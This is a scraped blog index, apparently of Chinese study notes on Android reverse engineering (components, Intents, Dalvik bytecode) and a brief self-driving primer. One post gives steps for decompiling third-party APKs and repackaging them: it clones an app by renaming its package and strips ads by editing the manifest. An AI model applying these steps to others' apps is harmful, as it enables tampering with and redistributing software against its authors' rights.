容器的特点上面也提及过，无序不可重复。Set 的常见实现类有HashSet、TreeSet 等，一般使用HashSet。 Map 就是用来存储“键(key)-值(value) 对”的。 Map 类中存储的“键值对”通过键来标识，所以“键对象”不能重复。Map 在实际开发中使用非常广，特别是HashMap。put 进行添加值键对，containsKey 验证主要是否存在、containsValue 验证值是否存在、keySet 获取所有的键集合、values 获取所有值集合、entrySet 获取键值对。 ","date":"2021-08-11","objectID":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/:2:0","tags":["逆向"],"title":"Android逆向学习小记(2)","uri":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/"},{"categories":["学习","安全技术"],"content":"0x02 Android ","date":"2021-08-11","objectID":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/:3:0","tags":["逆向"],"title":"Android逆向学习小记(2)","uri":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/"},{"categories":["学习","安全技术"],"content":"Activity Activity（活动）是Android提供的四大组件之一，是进行Android开发必不可少的组件。 Activity是一个界面的载体，可以把它与html页面进行类比，html页面由各种各样的标签组成，而Activity则可以由各种控件组成。Activity是一个应用组件，用户可与其提供的屏幕进行交互，以执行拨打电话、聊天、发送电子邮件等操作。每个 Activity 都会获得一个用于绘制其用户界面的窗口。窗口通常会充满屏幕，但也可小于屏幕并浮动在其他窗口之上，因此每一个Activity都有一个生命周期。 创建Activity（活动）所要执行的方法： 1）Create()这个方法已经看到过很多次了，每个活动中我们都重写了这个方法，它会在活动第一次被创建的时候调用。我们在这个方法中完成活动的初始化操作，比如说加载布局、绑定事件等。 2）Start()这个方法在活动由不可见变为可见的时候调用，即Activity被显示到屏幕上的时候调用此方法。 3）Resume()这个方法在活动准备好和用户进行交互的时候调用。此时的活动一定位于返回栈的栈顶，并且处于运行状态，即能够获得用户的焦点之前调用此方法。 Activity（活动）被销毁时所执行的方法： 1）onPause()这个方法在系统准备去启动或者恢复另一个活动的时候调用。当第一个Activity 通过Intent 启动第二个Activity 的时候，将调用第一个Activity 的onPause()方法。然后调用第二个Activity的onCreate()，onStart()，onResume()方法，接着调用第一个 Activity 的 onStop()方法。如果第一个 Activity 重新获得焦点,则将调用onResume()方法；如果第一个Activity 进入用户不可见状态，那么将调用onStop()方法。 2）onStop()这个方法在活动完全不可见的时候调用，即当第一个 Activity 被第二个Activity完全覆盖,或者被销毁的时候回调用此方法。它和 onPause()方法的主要区别在于，如果启动的新活动是一个对话框式的活动，那么 onPause()方法会得到执行，而onStop()方法并不会执行。 3）onDestroy()这个方法在活动被销毁之前调用，之后活动的状态将变为销毁状态，或者是调用finish()方法结束Activity的时候调用此方法。可以在此方法中进行收尾工作，比如释放资源等。 4）onRestart()这个方法在活动由停止状态变为运行状态之前调用，接着将调用 onStart()方法，也就是活动被重新启动了。 Activity（活动）的管理模式 Android采用Task来管理多个Activity。当启动一个APP时,Android就会为之创建一个Task，然后每启动一个activity，则把当前的activity 压到栈顶。比如以此启动页面a-\u003eb\u003ec，栈里面的结构如图所示 c-—-栈顶 b a-—-栈底 按返回键的时候，从栈顶弹出页面依次为c-\u003eb-\u003ea 2.Activity的四种启动模式 1）standard模式 它是活动默认的启动模式，在不进行显示制定的情况下，所有活动都会自动使用这种启动模式。每次通过此模式来启动activity时，Android总会为目标activity启动一个新的实例。A 跳到了A1 ，A1 又跳到了 A2，但在我们返回点击 BACK 按钮的时候，要一个一个按才会退出程序，这就是standard模式的特点。 2）singleTop模式 看完标准模式觉得不太友好，再次使用还需要重新建立活动，而singleTop模式很好的解决了这个问题。就是启动活动的时候，它会去栈中查找一下，看有没有已经存在的活动，有的话就将其调到栈顶，没有就重新创建。 3）singleTask模式 使用这种加载模式的activity在同一个Task内只有一个实例，当系统采用此singleTask模式启动activity时，可分三种情况： a. 如果将要启动的activity 不存在，系统将会创建目标activity 实例，并将它加入到Task栈顶。 b.如果将要启动的activity已经位于Task栈顶，此时与singleTop模式的行为相同。 c. 如果将要启动的 activity 已经存在，但没有位于 Task 栈顶，系统将会把位于该activity上面的所有activity移出Task栈，从而使得目标activity转入栈顶。 4）singleInstance模式 使用singleInstance 模式就可实现程序间可以共享活动的实例，在这种模式下会有一个单独的返回栈来管理这个活动，不管是哪个应用程序来访问这个活动，都共用的同一个返回栈，也就解决了共享活动实例的问题。 此加载模式下，无论从哪个Task中启动目标activity，只会创建一个目标activity实例，并会使用一个全新的Task栈来装载该activity实例。当系统采用singleInstance模式启动activity时，可以分为两种情况： a.如果将要启动的activity不存在，系统会先创建一个全新的Task、再创建目标activity的实例，并将它加入新的Task的栈顶。 b. 如果将要启动的activity 已经存在，无论它位于哪个应用程序中，无论它位于哪个Task中，系统将会把该activity所在的Task转到前台，从而使用该activity显示出来。 Intent是对一个即将进行的操作的抽象，Intent的字面意识就是”意图”，Android应用程序中的三种其他应用程序基本组件——Activity, Service和Broadcast Receiver，都是使用称为intent的消息来”激活”的。如果是两个相邻activity之间的传值，使用Intent传值。 常见Activity之间的三种传递方式 1）Extras，在intent中附加消息 //传值\rIntent intent = new Intent(this, XXXActivity.class);\rintent.putExtra(key, value);\rstartActivity(intent);\r//取值\rgetIntent()方法得到intent对象\rIntent intent = getIntent();\r//获取Intent中的数据：getXXXExtra()方法\rintent.getIntExtra(key, value);---\u003eint\rintent.getStringExtra(key);---\u003eString\r显示方式：\r吐司：Toast.makeText(this, \"\", Toast.LENGTH_SHORT).show();\r打印:Log.i(\"TAG\", \"....\");\r显示在TextView控件上：\rmTextView.setText();\r2）Bundle传值 //传值：\rIntent对象\rIntent intent = new Intent(.......);\r创建Bundle对象,包裹数据\rBundle bundle = new Bundle();\rbundle.putInt(key, value);\rbundle.putString(...);\rbundle.putBoolean(...);\r......\r将bundle挂载到Intent对象上\rintent.putExtras(bundle);\r跳转页面\rstartActivity(intent);\r//取值\rgetIntent()得到intent对象\r获取Bundle对象\rintent.getExtras();---\u003eBundle bundle\rbundle.getInt(key);\rbundle.getString(key);\r...........\r显示：同上\r3）通过对象方式传值 //传值\rIntent intent = new Intent(this, XXXActivity.class);\r创建一个类实现序列化(Person为例)\r部分代码：\rpublic class Person implements Serializable{\rprivate static final long serialVersionUID = 1L;\rprivate String name;\rprivate List\u003cString\u003e list;\r....}\r创建Person对象\rPerson person = new Person();\rperson.setName(...);\rList\u003cString\u003e list = new ArrayList\u003c\u003e();\rlist.add(...);\rperson.setList(list);\r在intent上设置序列化对象\rintent.putExtra(key, person);\r跳转\rstartActivity(intent);\r//取值\r获取intent对象\rgetIntent();--\u003eIntent intent\r获取序列化对象\rintent.getSerializableExtra(key);--\u003ePerson person\r显示在TextView上：\rmTextView.setText(person.toString());\r","date":"2021-08-11","objectID":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/:3:1","tags":["逆向"],"title":"Android逆向学习小记(2)","uri":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/"},{"categories":["学习","安全技术"],"content":"Service Service是是不能与用户交互的，不能自己启动的，运行在后台的程序。 Service基本上分为两种形式：启动状态和绑定状态。 启动状态 ：当应用组件（如 Activity）通过调用 startService() 启动服务时，服务即处于“启动”状态。一旦启动，服务即可在后台无限期运行，即使启动服务的组件已被销毁也不受影响，除非手动调用才能停止服务， 已启动的服务通常是执行单一操作，而且不会将结果返回给调用方。 绑定状态 ：当应用组件通过调用 bindService() 绑定到服务时，服务即处于“绑定”状态。绑定服务提供了一个客户端-服务器接口，允许组件与服务进行交互、发送请求、获取结果，甚至是利用进程间通信 (IPC) 跨进程执行这些操作。 仅当与另一个应用组件绑定时，绑定服务才会运行。 多个组件可以同时绑定到该服务，但全部取消绑定后，该服务即会被销毁。 当我们第一次启动Service时，先后调 onCreate(),onStartCommand ()这两个方法，当停止Service 时，则执行onDestroy()方法，这里需要注意的是，如果 Service 已经启动了，当我们再次启动Service 时，不会再执行onCreate()方法，而是直接执行onStartCommand ()方法。 startService启动Service的生命周期 执行 startService 时，Service 会经历 onCreate-\u003eonStartCommand 。当执行stopService 时，直接调用onDestroy 方法。调用者如果没有stopService，Service 会一直在后台运行，下次调用者再起来仍然可以stopService。 bindService启动Service的生命周期 执行 bindService 时，Service 会经历 onCreate-\u003eonBind 。这个时候调用者和Service 绑定在一起。调用者调用unbindService 方法或者调用者Context 不存在了（如Activity 被finish 了），Service 就会调用onUnbind-\u003eonDestroy，这里所谓的绑定在一起就是说两者共存亡了。 ","date":"2021-08-11","objectID":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/:3:2","tags":["逆向"],"title":"Android逆向学习小记(2)","uri":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/"},{"categories":["学习","安全技术"],"content":"BroadcastReceiver BroadcastReceiver 用来接收来自系统和应用中的广播。对接收到的广播进行选择处理，想要接收什么样的广播和内部定义的广播匹配，匹配则进行该做的处理操作，没有匹配则无操作，就比如在玩游戏的同时接收到短信事件，对此你要做什么操作，是想看短信内容还是不做什么处理继续玩游戏，这就是广播的用途。 广播的运行原理简图如下： 广播的生命周期十秒左右，如果在 onReceive() 内做超过十秒内的事情，就会报错。每次广播到来时 , 会重新创建 BroadcastReceiver 对象 , 并且调用 onReceive() 方法 , 执行完以后 , 该对象即被销毁 . 当 onReceive() 方法在 10 秒内没有执行完毕， Android会认为该程序无响应 . 所以在BroadcastReceiver 里不能做一些比较耗时的操作。所以一般遇到比较耗时的工作，应该发送intent 给service,由service 完成。 创建广播接收器也非常简单，我们只需要创建一个类继承自BroadCastReceiver 并实现onReceive()方法即可。 当广播到来的时候，onReceive()就会执行，具体的处理逻辑代码写在这个方法中就可以了。范例如下： package com.feichen.receiver; import android.content.BroadcastReceiver; import android.content.Context; import android.content.Intent; import android.util.Log; public class MyReceiver extends BroadcastReceiver { private static final String TAG = \"MyReceiver\"; @Override public void onReceive(Context context, Intent intent) { String msg = intent.getStringExtra(\"msg\"); Log.i(TAG, msg); } } 注册广播的分类有两种，一种是在代码中注册，即动态注册，一种是在AndroidMainfest.xml 中注册，静态注册。 动态注册是在代码中动态指定广播地址并注册。通常是在Activity 或Service 注册一个广播。 MyReceiver receiver = new MyReceiver(); IntentFilter filter = new IntentFilter(); filter.addAction(\"android.intent.action.MY_BROADCAST\"); registerReceiver(receiver, filter);\r这种注册方式与静态注册相反，不是常驻型的，也就是说广播会跟随程序的生命周期。当注册完成之后，这个接收者就可以正常工作了。 静态注册是在AndroidManifest.xml 文件中配置的这里给MyReceiver 注册一个广播地址。 \u003creceiver android:name=\".MyReceiver\"\u003e \u003cintent-filter\u003e \u003caction android:name=\"android.intent.action.MY_BROADCAST\"/\u003e \u003ccategory android:name=\"android.intent.category.DEFAULT\" /\u003e \u003c/intent-filter\u003e \u003c/receiver\u003e 配置了好之后，只要是 android.intent.action.MY_BROADCAST 这个地址的广播，MyReceiver 都能够接收到。注意，这种方式的注册是常驻型的，也就是说当应用关闭后，如果有广播信息传来，MyReceiver 也会被系统调用而自动运行。 ","date":"2021-08-11","objectID":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/:3:3","tags":["逆向"],"title":"Android逆向学习小记(2)","uri":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/"},{"categories":["学习","安全技术"],"content":"ContentProvider ContentProvider 是内容提供者，就是另外一个应用想要访问此应用中私有的数据库，此应用中提供了一个中间对象来供其他应用访问，这个中间对象就是内容提供者。比较官方的理解为，ContentProvider 管理对结构化数据集的访问，它们封装数据，并提供用于定义数据安全性的机制，其他应用通过Context 的ContentResolver 对象作为客户端与ContentProvider 进行通信，访问操作数据。 Android 的数据存储方式总共有五种，分别是：Shared Preferences、网络存储、文件存储、外储存储、SQLite。 但我们知道一般这些存储都只在单独的一个应用程序之中达到一个数据的共享，有时我们需要操作其他应用程序的一些数据，例如操作系统里的通讯录，这时我们就可能通过ContentProvider 来满足我们的需求了。用一张图介绍下： ContentProvider 常见的几个类 ContentResolver 在 ContentProvider的 使 用 过 程 中 ， 需 要 借 用 ContentResolver来 控 制ContentProvider所暴露处理的接口，作为代理来间接操作ContentProvider以获取数据。在 Context.java 的源码中如下抽象方法： /*Return a ContentResolver instance for your application's package.*/\rpublic abstract ContentResolver getContentResolver();\r能够在所有继承 Context 的类中通过 getContentResovler() 方法获取ContentResolver。 ContentObserver ContentObserver 内容观察者，用于观察Uri 引起ContentProvider 中数据变化和通知外界（即访问该数据访问者）。当ContentProvider 中的数据发生变化时，就会触发该ContentObserver 类。 3.URI Uri 是统一资源定位符，外界进程通过URI 来找到对应的ContentProvider 和其中的数据，再进行数据操作。ContentProvider 中的URI 有固定格式，如下图： ","date":"2021-08-11","objectID":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/:3:4","tags":["逆向"],"title":"Android逆向学习小记(2)","uri":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/"},{"categories":["学习","安全技术"],"content":"0x03 Dalvik Dalvik 虚拟机是Android 程序的虚拟机，是Android 中Java 程序的运行基础。每一个Android应用在底层都会对应一个独立的Dalvik 虚拟机实例，其代码在虚拟机的解释下得以执行。 Dalvik 虚拟机（DVM）是基于寄存器的架构，运行的是Dalvik 字节码，Java 虚拟机(JVM)是基于栈的架构，运行的是java 字节码。JAVA 程序经过编译，生成JAVA字节码保存在class 文件中，JVM 通过解码class 文件中的内容来运行程序，而DVM运行的是Dalvik 字节码，所有的Dalvik 字节码由JAVA 字节码转换而来，并被打包到一个DEX 可执行文件中，DVM 通过解释DEX 文件来执行这些字节码。 ART 虚拟机也是一种在Android 操作系统上的运行环境，ART 能够把应用程序的字节码转换为机器码，是Android 所使用的一种新的虚拟机。Dalvik 与ART 区别在于，Dalvik 适用于Android 4.4 及其以下系统使用，而ART适用于Android 4.4 以上系统使用，并且在Android 5.0 及后续Android 版本中作为正式的运行库取代了以往的Dalvik 虚拟机。现在的运行环境基本都是基于 ART 虚拟机运行的。ART 运行时是和Dalvik 虚拟机一样，实现了一套完全兼容Java 虚拟机的接口，因此学习dalvik 虚拟机有助于我们更好的理解app 在我们手机系统上运行。 Dalvik 虚拟机解释执行的是dex 字节码，ART 虚拟机执行的是本地机器码（而这些本地机器码是从 dex 字节码转换而来）。一个简单转换过程如下： java–\u003ejava bytecode(.jar)–\u003edalvik bytecode(.dex) java–\u003ejava bytecode(.jar)–\u003edalvik bytecode(.dex)–\u003eoptimized androidruntime machine code(.odex) ART 的优势在于采用的是AOT 编译，应用在第一次安装的时候，字节码就会预先编译成机器码存储在本地。而在Dalvik 下，应用每次运行的时候，字节码都需要通过即时编译器(JIT)转换为机器码再执行。在app 运行的时候，ART 比Dalvik 少了解释字节码的过程，所以app 的运行效率会有所提高，反馈给我们的效果就是卡顿更少，更加流畅。不过ART 需要应用程序在安装时，就把程序代码转换成机器语言，由于有了一个转码的过程，所以应用安装时间会增加。 Dalvik 虚拟机是基于寄存器架构的，其使用的寄存器都是 32 位的。对于64 位类型，使用相邻两个寄存器来表示。而寄存器的命名方式有两种，一种是v 命名法，一种是p 命名法。根据 Dalvik 虚拟机规定，方法参数使用最后面的寄存器。因此 v 命名法和p 命名法。用一张图表示如下，其中使用了M 个寄存器，有N 个参数。 Dalvik 字节码有两种类型，基本类型和引用类型，除了对象和数组以外，其他的所有Java 类型都是基本类型。基本类型都是使用单个字母来表示。数组类型使用 [ 表示。除数组以外的引用类型使用 L 加上全限定名表示。Dalvik 类型描述符如图所示： Dalvik 字段描述格式如下： 类型;-\u003e字段名称：类型描述符 如：com.test.Test 类中的一个 String 类型的 name 字段，在 Dalvik 中就可表示为Lcom/test/Test;-\u003ename:Ljava/lang/String Dalvik 方法描述格式如下： 类型;-\u003e方法名(参数类型描述符)返回值类型描述符 如：com.test.Test 类中的 add() 方法有两个int 类型参数，返回值为int, 在Dalvik中可表示为Lcom/test/Test;-\u003eadd(II) Dalvik的指令格式如下：基础字节码 名称后缀/字节码后缀 目的寄存器 源寄存器 例：move-wide/from16 vAA,vBBBB move 为基础字节码，即opcode wide 为名称后缀，标识指令操作的数据宽度为64 位 from16 为字节码后缀，表示源为一个16 位的寄存器引用变量名称 vAA 为目的寄存器,它始终在源的前面，取值范围为v0~v255 vBBBB 为源寄存器，取值范围为v0~v65535 常见的十三种Dalvik操作指令介绍如下： 1）空操作指令 空操作指令的助记符为nop。它的值为00,通常nop 指令被用来作对齐代码之用,无实际操作。 2）数据操作指令move move vA, vB 将vB.寄存器的值赋给vA 寄存器,源寄存器与目的寄存器都为4 位 move/from16 vAA,vBBB 将vBBBB 寄存器的值赋给vAA 寄存器,源寄存器为16 位,目的寄存器为8 位 move-wide vA,vB 为4 位的寄存器对赋值。源寄存器与目的寄存器都为4 位 move-object vA,vB object 是对象。这里是为对象赋值。源寄存器与目的寄存器都为4 位 move-object/froml6 vAA,vBBB 为对象赋值。源寄存器为16 位,目的寄存器为8 位 move-object/16 vAA,vBBBB 为对象赋值。源寄存器与目的寄存器都为16 位 move-result vAA 将上一个invoke 类型指令操作的单字非对象结果赋给vAA 寄存器 move-result-wide vAA 将上一个invoke 类型指令操作的双字非对象结果赋给vAA 寄存器 move-result-object vAA 将上一个invoke 类型指令操作的对象结果赋给vAA 寄存器 move-exception vAA 将发生的异常 赋给vAA 寄存器 move 指令有三种作用： 第一种作用:进行赋值操作 第二种作用:move-result 按收方法返回值操作 第三种作用:处理异常的操作 3）返回指令 4）数据定义指令 5）实例操作指令 6）数组操作指令 7）异常指令 throw vAA 抛出vAA寄存器中指定类型的异常 8）跳转指令 9）比较指令 10）字段操作指令 11）方法调用指令 12）数据转换指令 13）数据运算指令 ","date":"2021-08-11","objectID":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/:4:0","tags":["逆向"],"title":"Android逆向学习小记(2)","uri":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-08-03","objectID":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/:0:0","tags":["逆向"],"title":"Android逆向学习小记(1)","uri":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/"},{"categories":["学习","安全技术"],"content":"0x00 前言 WhITECat安全团队开展了Android逆向学习的入门活动，正好对这块儿有些兴趣，趁此机会学习一下，顺便记录。 ","date":"2021-08-03","objectID":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/:1:0","tags":["逆向"],"title":"Android逆向学习小记(1)","uri":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/"},{"categories":["学习","安全技术"],"content":"0x01 准备工作 Android逆向常用指令集 netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -o 显示网络与每个连接相关的所属进程 ID taskkill /T 终止指定的进程和由它启用的子进程。 taskkill /F 指定强制终止进程。 taskkill /? 显示帮助消息。 Windows 中杀死进程分两步：1 查询端口占用2.强行杀死进程 例：#查询一下本地所有网络连接，提取包含 8080（已建立连接）的行 netstat -ano | findstr “8080” taskkill /pid 4000 -t -f 常用ADB命令(用于电脑与手机或者模拟器交互) 在咸鱼上淘了个Nexus5，参考https://www.cnblogs.com/exmyth/p/4623180.html刷root，然后配置 adb 调试，安装MT管理器。 雷电模拟器，该款模拟器的优势在于内存占用少，稳定，速度也比较快，当然最重要的是该模拟器在无需签名 app 也可以正常在模拟器上运行，同时已自动开启全局调试模式。模拟器自动开启了USB调试，只需要安装上MT管理器就完成环境搭建。 环境搭建需要配置好Java和SDK、NDK的环境变量。安装可视化的安卓应用逆向工具AndroidKiller，有Apk 反编译、Apk 打包、Apk签名，编码互转等功能。简化了逆向分析apk使用不同工具的繁琐工作。使用AndroKiller打开apk,修改smail代码，编译生成apk，安装。 ","date":"2021-08-03","objectID":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/:2:0","tags":["逆向"],"title":"Android逆向学习小记(1)","uri":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/"},{"categories":["学习","安全技术"],"content":"0x02 APK文件结构 Android 应用是用Java 编程语言编写实现的，利用Android SDK 编译代码，并且把所有的数据和资源文件打包成APK(Application Package)文件，可以简单把apk视为一个压缩包。常见目录如下： assets目录：存放需要打包到 APK的静态资源文件，例如图片资源文件、JSON 配置文件、渠道配置文件、二进制数据文件、HTML5 离线资源文件等。与res/raw 目录不同的是，assets 目录支持任意深度的子目录，同时该目录下面的文件不会生成资源ID。 lib目录：存放程序依赖的native 库文件，一般是用C/C++编写，这里的lib 库可能包含4 中不同类型，根据CPU 型号的不同，大体可以分为ARM，ARM-v7a，MIPS，X86，分别对应着ARM 架构，ARM-V7 架构，MIPS 架构和X86 架构。 META-INF目录：存放着应用程序的的签名和证书，该信息可以验证APK 的完整性。META-INF 目录中包含的文件有CERT.RSA(公钥、加密算法等信息)，CERT.SF(对摘要文件的签名文件)和MANIFEST.MF(摘要文件)。详情参考：https://blog.csdn.net/lostinai/article/details/54694564 res目录：存放应用程序的资源，如图片资源，xml 配置资源。此文件夹下的所有文件都会映射到Android 工程中的.R 文件中，生成对应的资源ID，访问的时候直接使用资源ID，即R.ID.FILENAME，res 文件夹下可以包含多个文件夹；anim 是存放动画文件的；drawable 目录存放图形资源；layout 目录存放布局文件；values 目录存放一些特征值；colors.xml 存放color 的颜色值等。 AndroidManifest.xml文件：应用程序的配置文件，Android 应用的四大组件（Activity、Service、BroadcastReceiver 和 ContentProvider ）都在此配置和声明。 classes.dex文件：应用程序的可执行文件，Android 的所有java 代码都在这，通过反编译工具可以查看其代码。当文件中的方法数超过65535就会进行分包处理，若未超过则只有一个dex。 resources.arsc文件：资源索引表，资源配置文件，用来记录资源文件和资源ID 之间的映射关系，用来根据资源ID寻找资源。 Android应用Apk的安装有如下四种方式： 1.系统应用安装。没有安装界面，在开机时自动完成。 2.网络下载应用安装。没有安装界面，在应用市场完成。 3.ADB命令安装。没有安装界面，通过命令直接安装 4.外部设备安装。有安装界面，通过SD卡等外部设备安装，由packageInstaller处理安装逻辑。 ","date":"2021-08-03","objectID":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/:3:0","tags":["逆向"],"title":"Android逆向学习小记(1)","uri":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/"},{"categories":["学习","安全技术"],"content":"0x03 修改apk图标实现二次打包 应用原始图标 将apk拖入AndroidKiller进行反编译，在AndroidManfest.xml配置文件中查看图片资源的名称。 ****META-INF目录下的MANIFEST.MF文件对apk 中所有文件和非文件进行摘要处理，因此在此文件中可以找到图标资源对应的路径。 到res目录下，替换相应的文件，再回编译该apk。在apk 中，每一个apk 都有一个唯一的包名。手机系统通过这个包名来检测是否属于同一个app,也就是包名是apk 的唯一标识。故需要删除之前安装的apk后再安装新apk。 ","date":"2021-08-03","objectID":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/:4:0","tags":["逆向"],"title":"Android逆向学习小记(1)","uri":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/"},{"categories":["学习","安全技术"],"content":"0x04 修改apk包名实现分身 在AndroidManifest.xml 中的manifest 标签中的package 属性，这个属性后面的值就是 apk 的包名，这里是 package=“com.miniclip.angerofstick2.yyh” ，修改package 的 属 性 值 （ 不 要 改 为 中 文 ） ， 这 里 改 为package=“com.miniclip.angerofstick2.yyh.pro ”,然后还需要修改的是provider,即内容提供者，在 AndroidManifest.xml 中 搜 索 ” \u003cprovider” ， 修 改 provider 标 签 里 面 的android:authorities 这个属性的值，这里在原有的值后面全部加上1，然后点击保存。 回编译，安装，发现成功安装两个一样的app，并且可以正常运行。 修改apk名称方式有两种： 1、局搜索字符串\"火柴人突击格斗”，替换所有\"火柴人突击格斗\"为\"我的app\"。建议此方法，效率更高，且不容易出错。 2、修改配置文件，直接固定apk 的名称。因为AndroidManifest.xml是 apk 的配置清单文件，所以可以直接修改这个文件进行篡改 apk 的名称。在AndroidManifest.xml 找 到 android:label ， 修 改 所 有 地 方 ， 这 里 改 成android:label=“你的app”,然后保存。 ","date":"2021-08-03","objectID":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/:5:0","tags":["逆向"],"title":"Android逆向学习小记(1)","uri":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/"},{"categories":["学习","安全技术"],"content":"0x05 修改apk资源实现去广告 apk 的启动界面是在AndroidManifest.xml 配置声明的，他的配置声明位置如图所示： 只需要修改apk 主界面的activity 为我们的初次打开界面即可去除开屏广告页面。在模拟器打开应用，使用adb命令查看是否正常开启。 使 用 命 令 adb shell dumpsys activity | findstr\"mFocusedActivity\"，查看当前界面的组件名为org.cocos2dx.lua.AppActivity。dumpsys 命令查询系统服务的运行状态 (对象的成员变量属性值)，命令格式：dumpsys 服务名。dumpsys activity，用于查询 AMS 服务相关信息。 \u003caction android:name=\"android.intent.action.MAIN\"/\u003e\r\u003ccategory android:name=\"android.intent.category.LAUNCHER\"/\u003e\rmain 和launcher 属性结尾的是当前的入口界面。删除初始化启动页面，标签里的android.intent.category.DEFAULT修改为android.intent.category.LAUNCHER 也可以直接删除整个activity，标签里的android.intent.category.DEFAULT修改为android.intent.category.LAUNCHER 去除掉laserdraw的弹窗广告。将该apk 拖入AndroidKiller 中反编译，打开AndroidManifest.xml，找到修改user-permission 标签，删除掉部分关于网络权限配置声明。 android.permission.INTERNET，访问网络连接，可能产生GPRS 流量 android.permission.CHANGE_WIFI_STATE，Wifi 改变状态 android.permission.ACCESS_WIFI_STATE，WiFi 状态 android.permission.ACCESS_NETWORK_STATE，网络状态 ","date":"2021-08-03","objectID":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/:6:0","tags":["逆向"],"title":"Android逆向学习小记(1)","uri":"/2021-08-03-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B01/"},{"categories":["学习"],"content":"\r","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:0:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"0x00 前言 菜鸡从来没有接触过Autodriving，先简单接触一下。这个笔记只是了解浅显的知识，有个基本的认知。 视频学习来源： 自动驾驶技术_1_基本介绍 自动驾驶技术_2_传感器及感知算法 自动驾驶技术_3_规划及控制算法 apollo无人驾驶 首届百度安全自动驾驶CTF冠军战队成员分享参赛经验和解题过程 ","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:1:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"0x01 基础知识 自动驾驶的分级从L0-L5，L0是无自动化，L1是指辅助驾驶，L2是指部分自动驾驶，L3是有条件的自动驾驶，L4是高度自动驾驶，L5是完全自动驾驶。 自动驾驶的技术框架。 传感器的类型和使用范围 多个传感器的覆盖与标定。 ","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:2:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"0x02 定位技术 PDF文件下载地址：https://www.researchgate.net/publication/321124951_Robust_and_Precise_Vehicle_Localization_based_on_Multi-sensor_Fusion_in_Diverse_City_Scenes ","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:3:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"0x03 感知相关算法 https://blog.csdn.net/Young_GY/article/details/75194914 https://blog.csdn.net/adamshan/category_9280008.html https://www.sohu.com/a/207740445_391994 https://github.com/ApolloAuto/apollo/tree/master/docs 